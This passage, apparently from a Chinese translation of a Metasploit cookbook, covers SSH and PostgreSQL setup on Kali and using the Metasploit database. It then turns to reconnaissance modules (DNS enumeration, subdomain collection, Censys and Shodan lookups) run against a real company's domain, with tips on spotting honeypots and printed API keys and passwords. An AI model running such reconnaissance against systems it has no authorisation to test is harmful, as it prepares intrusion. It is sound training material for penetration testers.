  \n## 设置 SSH 连接\n\nSecure Shell (SSH) 允许你通过不安全的网络安全地连接到远程主机。\n\n### 准备工作\n\n要配置 Kali\
  \ Linux 机器以进行远程登录，我们将首先更改默认的 root 密码并生成新的 SSH 主机密钥。\n\n### 如何操作...\n\n要更改 root 密码，请按如下方式使用\
  \ passwd 命令：\n\n```\nroot@kali:~# passwd\nEnter new UNIX password:\nRetype new UNIX\
  \ password:\npasswd: password updated successfully\n```\n\n要生成新的 SSH 主机密钥，步骤也相对简单：删除当前的\
  \ SSH 主机密钥，使用 dpkg-reconfigure openssh-server 命令重新配置 OpenSSH 服务器，并生成新的 SSH 主机密钥：\n\
  \n```\nroot@kali:~# rm /etc/ssh/ssh_host_*\nroot@kali:~# dpkg-reconfigure openssh-server\n\
  Creating SSH2 RSA key; this may take some time ...\n2048 SHA256:0k/J4YvIGYi eDI6YuOLDXADm5YUdrJSnzBKguuD9WWQ\
  \ root@kali (RSA)\nCreating SSH2 ECDSA key; this may take some time ...\n256 SHA256:eYU5TtQVzFYQtjo6l\
  \ yiVHku6SQWbgkMPMDtW8cgaAJ4 root@kali (ECDSA)\nCreating SSH2 ED25519 key; this\
  \ may take some time ...\n256 SHA256:8nj2LMKQ NOLKS9S90sWcBArs1PgpFfD/5h4vNrwI4sA\
  \ root@kali (ED25519)\n```\n\n出于实验室目的，我们将编辑 OpenSSH 服务器配置 `/etc/ssh/sshd_config`\
  \ 文件以允许 `root` 登录，通过将行 `#PermitRootLogin without-password` 更改为 `PermitRootLogin\
  \ yes`，如以下示例所示：\n\n```\n...\n# Authentication:\n#LoginGraceTime 2m\nPermitRootLogin\
  \ yes\n#StrictModes yes\n#MaxAuthTries 6\n#MaxSessions 10\n...\n```\n\n要使 OpenSSH\
  \ 服务在启动时自动运行，请运行 `systemctl enable ssh` 并通过使用 `systemctl restart ssh` 命令重新启动服务来完成配置，如下所示：\n\
  \n```\nroot@kali:~# systemctl enable ssh\nSynchronizing state of ssh.service with\
  \ SysV service script with /lib/systemd/systemd-sysv-install.\nExecuting: /lib/systemd/systemd-sysv-install\
  \ enable ssh\nroot@kali:~# systemctl restart ssh\nroot@kali:~#\n```\n\n这对于实验室环境来说是可以的，但在执行渗透测试时，请将\
  \ SSH 配置为使用加密密钥登录到 Kali Linux 机器。这比仅使用密码更安全。\n\n## 使用 SSH 连接到 Kali\n\n要连接到 Kali\
  \ 机器，我们只需要一个 SSH 客户端。大多数 Unix、Linux 和 macOS 操作系统已经安装了 SSH 客户端；然而，如果你使用 Windows 连接到\
  \ Kali Linux 机器，你将需要安装一个客户端，例如 PuTTY，它是 Windows 上最受欢迎和免费的 SSH 客户端之一。\n\n\n\n\n\n\
  ## How to do it...\n\n+   1. 要连接到 Kali Linux 虚拟机，你需要知道其 IP 地址。要查找 IP 地址，请登录虚拟机，打开一个终端窗口，并输入\
  \ `ip address` 命令，或简写为 `ip a`：\n\n```\nroot@kali:~# ip a\n1: lo: <LOOPBACK,UP,LOWER_UP>\
  \ mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\nlink/loopback 00:00:00:00:00:00\
  \ brd 00:00:00:00:00:00\ninet 127.0.0.1/8 scope host lo\nvalid_lft forever preferred_lft\
  \ forever\ninet6 ::1/128 scope host\nvalid_lft forever preferred_lft forever\n2:\
  \ eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group\
  \ default qlen 1000\nlink/ether 00:0c:29:b6:03:93 brd ff:ff:ff:ff:ff:ff\ninet 192.168.216.5/24\
  \ brd 192.168.216.255 scope global eth0\nvalid_lft forever preferred_lft forever\n\
  inet6 fe80::20c:29ff:feb6:393/64 scope link\nvalid_lft forever preferred_lft forever\n\
  ```\n\n记下第二个接口的 IP 地址，在此示例中为 192.168.216.5。\n\n+   2. 现在，使用主机操作系统的 SSH 客户端。输入用户名\
  \ `root` 后跟 @ 符号和 Kali Linux 虚拟机的 IP 地址 192.168.216.5：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_381_0.png)\n\
  \n在此 SSH 会话中，我们现在可以使用 SSH 客户端与 Kali Linux 虚拟机进行交互。\n\n启动连接后，你需要验证 SSH 证书。\n\n##\
  \ Configuring PostgreSQL\n\nMetasploit 的一个重要功能是对 PostgreSQL 的后端数据库支持，你可以使用它来存储渗透测试结果。任何渗透测试都包含大量信息，可能持续数天，因此存储中间结果和发现变得至关重要，例如目标主机数据、系统日志、收集的证据和报告数据。作为一款优秀的渗透测试工具，Metasploit\
  \ 具有适当的数据库集成，可快速高效地存储结果。在本教程中，我们将处理在 Kali Linux 中安装和配置数据库的过程。\n\n## Getting ready\n\
  \n要配置 PostgreSQL，我们将首先启动服务，然后使用 Metasploit 的 msfdb 命令初始化数据库。\n\n## How to do it...\n\
  \n+   1. 要设置我们的 Metasploit 数据库，我们首先需要使用以下命令启动 PostgreSQL 服务器：\n\n```\nroot@kali:~#\
  \ systemctl start postgresql\n```\n\n+   2. 然后我们需要使用带 init 选项的 msfdb 命令创建并初始化 msf\
  \ 数据库：\n\n```\nroot@kali:~# msfdb init\nCreating database user 'msf'\nEnter password\
  \ for new role:\nEnter it again:\nCreating databases 'msf' and 'msf_test'\nCreating\
  \ configuration file in /usr/share/metasploit-framework/config/database.yml\n```\n\
  \n## Creating initial database schema\n\nmsfdb 命令允许你管理 Metasploit Framework 数据库，而不仅仅是初始化数据库。要显示所有\
  \ msfdb 选项，请按如下方式运行命令：\n\n```\nroot@kali:~# msfdb\n```\n\n## Manage a metasploit\
  \ framework database\n\n```\nmsfdb init # initialize the database\nmsfdb reinit\
  \ # delete and reinitialize the database\nmsfdb delete # delete database and stop\
  \ using it\nmsfdb start # start the database\nmsfdb stop # stop the database\n```\n\
  \n3. 要修改数据库配置文件，我们可以编辑位于 /usr/share/metasploit-framework/config/database.yml 的 database.yml\
  \ 文件：\n\n```\nroot@kali:~# cat /usr/share/metasploit-framework/config/database.yml\n\
  development:\n  adapter: postgresql\n  database: msf\n  username: msf\n  password:\
  \ 3HCNhAtdH6F9F2iGa4z3wJVoI7UK1Ot+MG1zuKjYzn4=\n  host: localhost\n  port: 5432\n\
  \  pool: 5\n  timeout: 5\n\nproduction:\n  adapter: postgresql\n  database: msf\n\
  \  username: msf\n  password: 3HCNhAtdH6F9F2iGa4z3wJVoI7UK1Ot+MG1zuKjYzn4=\n  host:\
  \ localhost\n  port: 5432\n  pool: 5\n  timeout: 5\n\ntest:\n  adapter: postgresql\n\
  \  database: msf_test\n  username: msf\n  password: 3HcNhAtdH6F9F2iGa4z3wJVoI7UK1Ot+MG1zuKjYzn4=\n\
  \  host: localhost\n  port: 5432\n  pool: 5\n  timeout: 5\n```\n\n注意已创建的默认用户名、密码和默认数据库。如有必要，你也可以根据自己的喜好更改这些值。\n\
  \n+   4. 现在，让我们启动 msfconsole 界面并使用 db_status 命令确认 Metasploit 已成功连接到数据库：\n\n```\n\
  msf > db_status\n[*] postgresql connected to msf\n```\n\n## There's more...\n\n\
  要手动连接到数据库，你可以使用 db_connect 命令，后跟你想要连接到的凭据、主机和数据库，使用以下语法：\n\n```\ndb_connect <user:pass>@<host:port>/<database>\n\
  ```\n\n要测试 db_connect 命令，我们可以使用 database.yml 文件中的用户名、密码、数据库名称和端口号的值：\n\n```\nmsf\
  \ > db_disconnect\nmsf > db_status\n[*] postgresql selected, no connection\nmsf\
  \ > db_connect\nmsf:3HcNhAtdH6F9F2iGa4z3wJVoI7UK1Ot+MG1zuKjYzn4=@127.0.0.1/msf\n\
  [*] Rebuilding the module cache in the background...\nmsf > db_status\n[*] postgresql\
  \ connected to msf\n```\n\n我们也可以使用 -y 选项和数据库配置文件路径使用 db_connect：\n\n```\nmsf > db_disconnect\n\
  msf > db_status\n[*] postgresql selected, no connection\nmsf > db_connect -y /usr/share/metasploit-framework/config/database.yml\n\
  [*] Rebuilding the module cache in the background...\nmsf > db_status\n[*] postgresql\
  \ connected to msf\n```\n\n如果你希望每次启动 msfconsole 时数据库都连接，将数据库配置文件复制到 Metasploit 安装程序在你的主目录中创建的\
  \ .msf4 目录中。\n\n## Creating workspaces\n\nMetasploit 中的工作区用于分隔数据集，让你保持井然有序。在开始新的渗透测试之前，最好创建一个新的工作区来组织所有收集的数据，从而避免被之前的测试污染。\n\
  \n## How to do it...\n\n+   1. 连接到数据库时选择的默认工作区，用其名称前的 * 字符表示：\n+   \n+   ```\n+\
  \   msf > workspace\n+   * default\n+   ```\n+   2. 要显示 workspace 命令的用法，请使用 -h 选项如下：\n\
  +   \n+   ```\n+   msf > workspace -h\n+   Usage:\n+       workspace           \
  \     List workspaces\n+       workspace -v             List workspaces verbosely\n\
  +       workspace [name]         Switch workspace\n+       workspace -a [name] ...\
  \  Add workspace(s)\n+       workspace -d [name] ...  Delete workspace(s)\n+   \
  \    workspace -D             Delete all workspaces\n+       workspace -r <old>\
  \ <new> Rename workspace\n+       workspace -h             Show this help information\n\
  +   ```\n+   3. 要添加新的工作区，请使用 -a 选项后跟工作区的名称：\n+   \n+   ```\n+   msf > workspace\
  \ -a book\n+   [*] Added workspace: book\n+   ```\n\n4. 要列出可用的工作区，只需输入 `workspace`\
  \ 命令：\n\n```\nmsf > workspace\n  default\n* book\n```\n\n5. 要删除工作区，请使用 -d 选项后跟工作区的名称：\n\
  \n```\nmsf > workspace -d book\n[*] Deleted workspace: book\n[*] Switched workspace:\
  \ default\n```\n\n6. 要更改当前工作区，请使用 `workspace` 命令后跟你想要切换到的工作区名称：\n\n```\nmsf > workspace\
  \ book\n[*] Workspace: book\n```\n\n7. 要重命名工作区，请使用 -r 选项的 `workspace` 命令后跟旧工作区名称和新工作区名称：\n\
  \n```\nmsf > workspace -r book metasploit\n[*] Switched workspace: metasploit\n\
  ```\n\n## Using the database\n\n配置数据库后，我们就可以开始使用它了。首先，我们将看看如何使用 `db_import` 命令从外部工具导入数据。\n\
  \n## Getting ready\n\n要在 msfconsole 中查看命令的用法并列出当前支持的文件类型，运行 `db_import` 命令：\n\n\
  ```\nmsf > db_import\nUsage: db_import <filename> [file2...]\n\nFilenames can be\
  \ globs like *.xml, or **/*.xml which will search recursively\nCurrently supported\
  \ file types include:\n  Acunetix\n  Amap Log\n```\n\n\n\nAmap Log -m\nAppscan\n\
  Burp Session XML\nBurp Issue XML\n...\nQualys Asset XML\nQualys Scan XML\nRetina\
  \ XML\nSpiceworks CSV Export\nWapiti XML\n\n## 如何操作...\n\n- 1. 为了测试 db_import 命令，我们将使用\
  \ nmap 命令，这是一个免费的安全扫描器、端口扫描器和网络探索工具，使用 -oX 选项将结果保存到 XML 文件中。以下是扫描 Metasploitable\
  \ 3 目标机器所使用的语法：\n- 2. 要导入扫描报告，可以使用 db_import 命令后跟要导入的报告的路径：\n\n```\nnmap -Pn -A\
  \ -oX report 192.168.216.10\n```\n\n```\nmsf > db_import /root/report\n[*] Importing\
  \ 'Nmap XML' data\n[*] Import: Parsing with 'Nokogiri v1.8.0'\n[*] Importing host\
  \ 192.168.216.10\n[*] Successfully imported /root/report\n```\n\n或者，你可以直接从 msfconsole\
  \ 运行 db_nmap 命令，结果将保存在当前数据库中。db_nmap 命令的工作方式与常规 nmap 命令相同：\n\n```\nmsf > db_nmap\
  \ -Pn -A 192.168.216.129\n[*] Nmap: Starting Nmap 7.60 ( https://nmap.org ) at\n\
  2017-10-17 05:05 EDT\n[*] Nmap: Nmap scan report for 192.168.216.129\n[*] Nmap:\
  \ Host is up (0.00092s latency).\n[*] Nmap: Not shown: 977 closed ports\n[*] Nmap:\
  \ PORT STATE SERVICE VERSION\n[*] Nmap: 21/tcp open ftp vsftpd 2.3.4\n[*] Nmap:\
  \ |_ftp-anon: Anonymous FTP login allowed (FTP code 230)\n```\n\n```\n[*] Nmap:\
  \ | ftp-syst:\n[*] Nmap: | STAT:\n...\n[*] Nmap: |_ System time: 2017-10-04T09:11:38-04:00\n\
  [*] Nmap: |_smb2-time: Protocol negotiation failed (SMB2)\n[*] Nmap: TRACEROUTE\n\
  [*] Nmap: HOP RTT ADDRESS\n[*] Nmap: 1 0.92 ms 192.168.216.129\n[*] Nmap: OS and\
  \ Service detection performed. Please report any incorrect results at https://nmap.org/submit/\
  \ .\n[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 31.88 seconds\n```\n\
  \n## 使用 hosts 命令\n\n现在数据库中已有数据，我们可以开始使用 hosts 命令来显示当前工作区中存储的所有主机：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_388_0.png)\n\
  \n## 如何操作...\n\n- 1. 使用 -h 发出 hosts 命令将显示帮助菜单：\n- \n\n```\nmsf > hosts -h\nUsage:\
  \ hosts [ options ] [addr1 addr2 ...]\n\nOPTIONS:\n-a,--add      Add the hosts instead\
  \ of searching\n-d,--delete   Delete the hosts instead of searching\n-c <col1,col2>\
  \ Only show the given columns (see list below)\n```\n\n-h,--help      Show this\
  \ help information\n-u,--up        Only show hosts which are up\n-o <file>     \
  \ Send output to a file in csv format\n-O <column>    Order rows by specified column\
  \ number\n-R,--rhosts    Set RHOSTS from the results of the search\n-S,--search\
  \    Search string to filter by\n-i,--info      Change the info of a host\n-n,--name\
  \      Change the name of a host\n-m,--comment   Change the comment of a host\n\
  -t,--tag       Add or specify a tag to a range of hosts\n\nAvailable columns: address,\
  \ arch, comm, comments, created_at, cred_count, detected_arch, exploit_attempt_count,\
  \ host_detail_count, info, mac, name, note_count, os_family, os_flavor, os_lang,\
  \ os_name, os_sp, purpose, scope, service_count, state, updated_at, virtual_host,\
  \ vuln_count, tags\n\n2. 使用 -c 选项，我们可以选择要显示的列：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_389_0.png)\n\
  \n3. 使用 -s 选项，我们可以搜索特定的字符串，例如操作系统名称：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_390_0.png)\n\
  \n## 理解 services 命令\n\nservices 命令允许我们显示主机上运行的服务。要查看 services 命令的帮助，可以使用 -h 选项：\n\
  \n```\nmsf > services -h\n```\n\n```\nUsage: services [-h] [-u] [-a] [-r <proto>]\
  \ [-p <port1,port2>] [-s <name1,name2>] [-o <filename>] [addr1 addr2 ...]\n```\n\
  \n- -a,--add          Add the services instead of searching\n- -d,--delete     \
  \   Delete the services instead of searching\n- -c <col1,col2>     Only show the\
  \ given columns\n- -h,--help          Show this help information\n- -s <name1,name2>\
  \   Search for a list of service names\n- -p <port1,port2>   Search for a list of\
  \ ports\n- -r <protocol>      Only show [tcp|udp] services\n- -u,--up          \
  \  Only show services which are up\n- -o <file>          Send output to a file in\
  \ csv format\n- -O <column>        Order rows by specified column number\n- -R,--rhosts\
  \        Set RHOSTS from the results of the search\n- -S,--search        Search\
  \ string to filter by\n\nAvailable columns: created_at, info, name, port, proto,\
  \ state, updated_at\n\n## 如何操作...\n\n1. 使用没有任何选项的 `search` 命令会显示所有可用的服务：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_391_0.png)\n\
  \n2. `services` 命令允许我们以精细的粒度过滤存储的信息，使我们能够搜索特定的服务名称：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_391_1.png)\n\
  \n3. 按如下方式搜索端口号：\n\n```\nmsf > services -p 22\n\nServices\n========\n\nhost    \
  \        port  proto  name  state  info\n----            ----  -----  ----  -----\
  \  ----\n192.168.216.10  22    tcp    ssh   open   OpenSSH 7.1 protocol 2.0\n192.168.216.129\
  \ 22    tcp    ssh   open   OpenSSH 4.7p1 Debian 8ubuntu1 protocol 2.0\n\nmsf >\n\
  ```\n\n4. 与 hosts 命令一样，我们可以使用 -s 选项搜索特定字符串：\n\n```\nmsf > services -S Apache\n\n\
  Services\n========\n\nhost            port  proto  name    state  info\n----   \
  \         ----  -----  ----    -----  ----\n192.168.216.10  8009  tcp    ajp13 \
  \  open   Apache Jserv Protocol v1.3\n192.168.216.10  8022  tcp    http    open\
  \   Apache Tomcat/Coyote JSP engine 1.1\n192.168.216.10  8383  tcp    ssl/http open\
  \  Apache httpd\n192.168.216.129 80    tcp    http    open   Apache httpd 2.2.8\
  \ (Ubuntu) DAV/2\n192.168.216.129 8009  tcp    ajp13   open   Apache Jserv Protocol\
  \ v1.3\n192.168.216.129 8180  tcp    http    open   Apache Tomcat/Coyote JSP engine\
  \ 1.1\n\nmsf >\n```\n\n5. 通过组合多个选项，你可以仅搜索特定主机并只显示想要的列：\n\n```\nmsf > services -c\
  \ name,port,info -S Apache 192.168.216.10\n\nServices\n========\n\nhost        \
  \    name    port    info\n----            ----    ----    ----\n192.168.216.10\
  \  ajp13   8009    Apache Jserv Protocol v1.3\n192.168.216.10  http    8022    Apache\
  \ Tomcat/Coyote JSP engine 1.1\n192.168.216.10  ssl/http 8383  Apache httpd\n\n\
  msf >\n```\n\n在后面的章节中，我们将介绍剩余的数据库命令，例如 loot、creds、vulns 和 notes。\n"
- "## 11\n信息收集与扫描\n\n在本章中，我们将介绍以下配方：\n\n- - 使用 Metasploit 进行被动信息收集\n- - 使用 Metasploit\
  \ 进行主动信息收集\n- - 端口扫描——Nmap 方式\n- - 端口扫描——db_nmap 方式\n- - 使用 ARP Sweep 进行主机发现\n-\
  \ - UDP 服务扫描器\n- - SMB 扫描和枚举\n- - 使用 SSH 版本扫描器检测 SSH 版本\n- - FTP 扫描\n- - SMTP 枚举\n\
  - - SNMP 枚举\n- - HTTP 扫描\n- - WinRM 扫描和暴力破解\n- - 与 Nessus 集成\n- - 与 NeXpose 集成\n\
  - - 与 OpenVAS 集成\n\n## 引言\n\n信息收集是渗透测试中第一项也是最重要的活动，如果不是最重要的话。这一步是为了尽可能多地了解目标机器的信息。\n\
  \n我们掌握的信息越多，成功利用目标的机会就越好。在信息收集阶段，我们的主要重点是收集有关目标机器的事实，例如 IP 地址、可用服务和开放端口。这些信息在渗透测试过程中发挥着至关重要的作用。为了实现这一目标，到本章结束时，我们将学习某些扫描技术，例如\
  \ SMB 扫描、SSH 服务器扫描、FTP 扫描、SNMP 枚举、HTTP 扫描以及 WinRM 扫描和暴力破解。\n\n信息收集、足迹分析和枚举是经常被互换使用的术语。但它们仍然不同。根据\
  \ SANS 标准，足迹分析是指获取有关组织的基本信息。这些信息包括正在使用的技术，例如互联网、内联网、远程访问和外联网。除了技术之外，还必须探索安全策略和程序。扫描包括在\
  \ IP 地址范围和网络块上执行自动 ping 扫描等基本步骤，以确定各个系统是否存活。枚举涉及对系统进行主动连接和有针对性的查询。黑客枚举的信息类型可以大致分为网络资源和共享、用户和组、应用程序和横幅以及网络块等类别。\n\
  \n信息收集中使用了三种基本技术：\n\n- - **被动信息收集：** 该技术用于在没有物理连接或访问目标的情况下获取有关目标的信息。这意味着我们使用其他来源来获取有关目标的信息，例如使用\
  \ whois 查询、Nslookup 等。假设我们的目标是一个在线 Web 应用程序；那么，简单的 whois 查询就可以为我们提供大量有关 Web 应用程序的信息，例如其\
  \ IP 地址、其域名和子域名、服务器的位置、托管服务器等。这些信息在渗透测试期间非常有用，因为它可以拓宽我们利用目标的途径。\n- - **主动信息收集：**\
  \ 在这种技术中，建立与目标的逻辑连接以获取信息。这种技术为我们提供了下一级的信息，可以直接补充我们对目标安全的理解。在端口扫描中，目标是最广泛使用的主动扫描技术，我们关注目标上开放的端口和正在运行的可用服务。\n\
  \n\n\n\n\n- **社会工程学：** 这种信息收集方式与被动信息收集类似，但依赖于人为失误，且信息以打印件、电话对话、错误的电子邮件 ID 等形式泄露出来。利用这种方法的技巧众多，且信息收集的理念截然不同，因此社会工程学本身就是一个独立的类别。例如，黑客会注册拼写错误且听起来相似的域名，并设置邮件服务器来接收此类错误邮件。这类域名被称为\
  \ **双胞胎域名；** 即邪恶的孪生体。\n\n社会工程学的受害者被诱骗泄露所需信息，而他们并不知道这些信息将被用于攻击企业网络。例如，企业中的一名员工可能会被骗透露员工识别号码给一个假装成他/她信任的人。虽然该员工号码对员工来说可能似乎没有价值，这使得他更容易一开始就透露信息，但社会工程师可以利用该员工号码结合其他收集到的信息，更接近于找到进入企业网络的方法。\n\
  \n## 使用 Metasploit 进行被动信息收集\n\n在本章中，我们将详细分析各种被动和主动信息收集技术。从开始，我们将分析最常用且最常被忽视的被动信息收集技术，并在后面的配方中，我们将专注于通过端口扫描获取信息。Metasploit\
  \ 具有多个内置扫描功能，以及一些与之集成的第三方工具，以进一步增强端口扫描过程。我们将分析内置扫描器，以及一些在 Metasploit Framework 上运行的流行第三方扫描器。让我们继续配方并开始获取有关目标的信息。\n\
  \n## 准备工作\n\n我们将以公司域名开始信息收集，获取有关公司的信息，搜索子域名，找到目标，检查蜜罐，收集电子邮件地址，等等。\n\n## 如何操作...\n\
  \nMetasploit Framework 具有多个用于信息收集的模块。在本配方中，你将学习如何使用其中一些模块。然而，我建议你探索框架中所有可用的 auxiliary\
  \ 模块。\n\n## DNS 记录扫描器和枚举器\n\nDNS 记录扫描器和枚举器 auxiliary 模块可用于通过执行各种 DNS 查询，例如区域传输、反向查找、SRV\
  \ 记录暴力破解和其他技术，从给定的 DNS 服务器收集有关域的信息。\n\n- 1. 要运行 auxiliary 模块，我们使用 use 命令后跟我们想要使用的模块，在本例中为\
  \ auxiliary/gather/enum_dns。然后我们可以使用 info 命令显示有关模块的信息，例如作者、基本选项和描述，如下所示：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_397_0.png)\n\
  \n2. 要运行该模块，我们需要设置域名，并为了使其运行得更快，我们将线程数设置为 10：\n\n```\nmsf > use auxiliary/gather/enum_dns\n\
  msf auxiliary(enum_dns) > set DOMAIN packtpub.com\nDOMAIN => packtpub.com\nmsf auxiliary(enum_dns)\
  \ > set THREADS 10\nTHREADS => 10\nmsf auxiliary(enum_dns) > run\n\n...\n[+] packtpub.com\
  \ NS: dns3.easydns.org.\n[+] packtpub.com NS: dns2.easydns.net.\n[*] Attempting\
  \ DNS AXFR for packtpub.com from dns1.easydns.com.\nW, [2017-10-17T10:04:14.963345\
  \ #5091] WARN -- : AXFR query, switching to TCP\n...\n\ninclude:_spf.freshsales.io\
  \ a:zgateway.zuora.com\ninclude:amazonses.com ~all\n[*] querying DNS SRV records\
  \ for packtpub.com\n[*] Auxiliary module execution completed\nmsf auxiliary(enum_dns)\
  \ >\n```\n\n从输出中可以看出，我们能够从目标域获取多个 DNS 记录。\n\n## 还有更多...\n\nDNS 记录扫描器和枚举器 auxiliary\
  \ 模块也可以用于主动信息收集，利用其暴力破解功能。通过将 ENUM_BRT 设置为 true，它将通过提供的词表暴力破解子域名和主机名，你可以通过将 WORDLIST\
  \ 选项设置为词表的路径来自定义该词表。\n\n## CorpWatch 公司名称信息搜索\n\n收集公司信息至关重要，为此我们可以使用 CorpWatch 公司名称信息搜索\
  \ auxiliary 模块，auxiliary/gather/corpwatch_lookup_name，它将为我们提供公司的名称、地址、部门和行业。\n\n\
  要运行 auxiliary/gather/corpwatch_lookup_name auxiliary 模块，我们可以使用 Microsoft 作为公司名称并将限制设置为\
  \ 1 以仅显示第一个结果：\n\n```\nmsf > use auxiliary/gather/corpwatch_lookup_name\nmsf auxiliary(corpwatch_lookup_name)\
  \ > set COMPANY_NAME Microsoft\nCOMPANY_NAME => Microsoft\nmsf auxiliary(corpwatch_lookup_name)\
  \ > set LIMIT 1\nLIMIT => 1\nmsf auxiliary(corpwatch_lookup_name) > run\n\n[*] Company\
  \ Information\n--------------------------------\n[*] CorpWatch (cw) ID: cw_4803\n\
  [*] Company Name: MICROSOFT CORP\n[*] Address: ONE MICROSOFT WAY, REDMOND WA 98052-6399\n\
  [*] Sector: Business services\n[*] Industry: Services-prepackaged software\n[*]\
  \ Auxiliary module execution completed\nmsf auxiliary(corpwatch_lookup_name) >\n\
  ```\n\n## 搜索引擎子域名收集器\n\n收集子域名是找到新目标的好方法，我们可以使用搜索引擎子域名收集器 auxiliary 模块，auxiliary/gather/searchengine_subdomains_collector，从\
  \ Yahoo 和 Bing 收集有关域的子域名。\n\n要从目标域收集子域名，我们只需设置目标域。让我们快速对 packtpub.com 进行测试并分析输出：\n\
  \n```\nmsf > use auxiliary/gather/searchengine_subdomains_collector\nmsf auxiliary(searchengine_subdomains_collector)\
  \ > set TARGET packtpub.com\nTARGET => packtpub.com\nmsf auxiliary(searchengine_subdomains_collector)\
  \ > run\n\n[*] Searching Bing for subdomains from domain:packtpub.com\n[*] Searching\
  \ Yahoo for subdomains from domain:packtpub.com\n[+] domain:packtpub.com subdomain:\
  \ www.packtpub.com\n[*] Searching Bing for subdomains from ip:83.166.169.231\n[*]\
  \ Searching Yahoo for subdomains from ip:83.166.169.231\n...\n\n[+] domain:packtpub.com\
  \ subdomain: www1.packtpub.com\n[*] Searching Bing for subdomains from ip:83.166.169.231\n\
  [*] Searching Yahoo for subdomains from ip:83.166.169.231\n```\n\n```\n[+] ip:83.166.169.231\
  \ subdomain: www.packtpub.com\n[+] ip:83.166.169.231 subdomain: www1.packtpub.com\n\
  [+] ip:83.166.169.231 subdomain: www2.packtpub.com\n[*] Auxiliary module execution\
  \ completed\n```\n\n搜索引擎子域名收集器 auxiliary 模块帮助我们找到了新的目标，例如 www.packtpub.com、cdp.packtpub.com、authorportal.packtpub.com\
  \ 等等。\n\n现在我们对一些基本模块的功能有了很好的了解，让我们试试大杀器。\n\n## Censys 搜索\n\nCensys 是一个搜索引擎，使研究人员能够询问构成互联网的主机和网络。通过对\
  \ IPv4 地址空间进行每日 ZMap 和 ZGrab 扫描，Censys 收集主机和网站的数据，进而维护主机和网站配置的数据库。\n\n使用 Censys\
  \ 搜索 auxiliary 模块，我们可以使用 Censys REST API 访问通过 Web 界面可访问的相同数据。搜索端点允许使用与主站点相同的搜索语法，对\
  \ IPv4、百万网站和证书索引中的当前数据进行搜索。\n\n要使用 Censys 搜索 auxiliary 模块，你首先需要在 https://censys.io/\
  \ 网站上创建一个免费账户以获取你的 API ID 和密钥。\n\n要使用 Censys 搜索 auxiliary 模块，我们将把 Censys dork 设置为\
  \ packtpub.com，搜索类型设置为 ipv4，然后是你的密钥和 API ID，并输入 run 运行模块：\n\n```\nmsf > use auxiliary/gather/censys_search\n\
  msf auxiliary(censys_search) > set CENSYS_DORK packtpub.com\nCENSYS_DORK => packtpub.com\n\
  msf auxiliary(censys_search) > set CENSYS_SEARCHTYPE ipv4\nCENSYS_SEARCHTYPE =>\
  \ ipv4\nmsf auxiliary(censys_search) > set CENSYS_SECRET\nJIxvPzj0RJkqOqd9cFNRYqNkHzH7E3en\n\
  CENSYS_SECRET => JIxvPzj0RJkqOqd9cFNRYqNkHzH7E3en\nmsf auxiliary(censys_search)\
  \ > set CENSYS_UID ec421f73-d438-1c48-15b3-5de240bef531\n```\n\n\nCENSYS_UID =>\
  \ ec421f73-d438-1c48-15b3-5de240bef531\nmsf auxiliary(censys_search) > run\n...\n\
  \n[+] 138.68.148.235 - 443/https,22/ssh,80/http\n[+] 83.166.169.235 - 80/http\n\
  [+] 83.166.169.228 - 80/http\n[+] 151.248.166.228 - 443/https,80/http\n[+] 151.248.166.228\
  \ - 443/https,80/http\n[*] Auxiliary module execution completed\nmsf auxiliary(censys_search)\
  \ >\n\n## Shodan Search\n\nShodan is a paid search engine for internet-connected\
  \ devices. Shodan lets you search for banners, grabs metadata about the device,\
  \ such as its geographic location, hostname, operating system, and more.\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_401_0.png)\n\
  \nTo use the Shodan Search auxiliary module, you first need to create an account\
  \ on the https://www.shodan.io website to get your API Key.\n\n```\nmsf > use auxiliary/gather/shodan_search\n\
  msf auxiliary(shodan_search) > set QUERY hostname:packtpub.com\nQUERY => hostname:packtpub.com\n\
  msf auxiliary(shodan_search) > set SHODAN_APIKEY\n1d0obpT1S1337sq6yx0gEKblap6yC2ib\n\
  SHODAN_APIKEY => 1d0obpT1S1337sq6yx0gEKblap6yC2ib\nmsf auxiliary(shodan_search)\
  \ > run\n...\n```\n\n## Search Results\n\n| IP:Port | City | Country | Hostname\
  \ |\n|------|------|---------|----------|\n| 109.234.207.107:25 | Wolverhampton\
  \ | United Kingdom | imap.packtpub.com |\n| 109.234.207.107:443 | Wolverhampton\
  \ | United Kingdom | imap.packtpub.com |\n| 109.234.207.107:587 | Wolverhampton\
  \ | United Kingdom | imap.packtpub.com |\n| 109.234.207.107:80 | Wolverhampton |\
  \ United Kingdom | imap.packtpub.com |\n| 109.234.207.107:993 | Wolverhampton |\
  \ United Kingdom | imap.packtpub.com |\n| 83.166.169.228:80 | Loughborough | United\
  \ Kingdom | packtpub.com |\n| 83.166.169.248:111 | Loughborough | United Kingdom\
  \ | imap.packtpub.com |\n| 83.166.169.248:161 | Loughborough | United Kingdom |\
  \ imap.packtpub.com |\n| 83.166.169.248:443 | Loughborough | United Kingdom | imap.packtpub.com\
  \ |\n| 83.166.169.248:80 | Loughborough | United Kingdom | imap.packtpub.com |\n\
  | 83.166.169.248:8080 | Loughborough | United Kingdom | imap.packtpub.com |\n\n\
  [*] Auxiliary module execution completed\nmsf auxiliary(shodan_search) >\n\nThe\
  \ Shodan Search auxiliary module has revealed further information about the target,\
  \ such as its IP address, open ports, location, and so on. These passive techniques\
  \ can reveal some interesting information about the target and can ease our way\
  \ for penetration testing.\n\n## Shodan Honeyscore Client\n\nChecking whether a\
  \ server is a honeypot or not is always a good idea. The last thing you want is\
  \ to waste your time or be blocked because you were trying to attack a honeypot.\
  \ Using the Shodan Honeyscore Client auxiliary module, you can use Shodan to check\
  \ whether a server is a honeypot or not. The API returns a score from 0.0 to 1.0,\
  \ 1.0 being a honeypot:\n\n```\nmsf > use auxiliary/gather/shodan_honeyscore\nmsf\
  \ auxiliary(shodan_honeyscore) > set SHODAN_APIKEY\n1d0obpT0SCLAQsq6yxogEKKh1p6yC2ib\n\
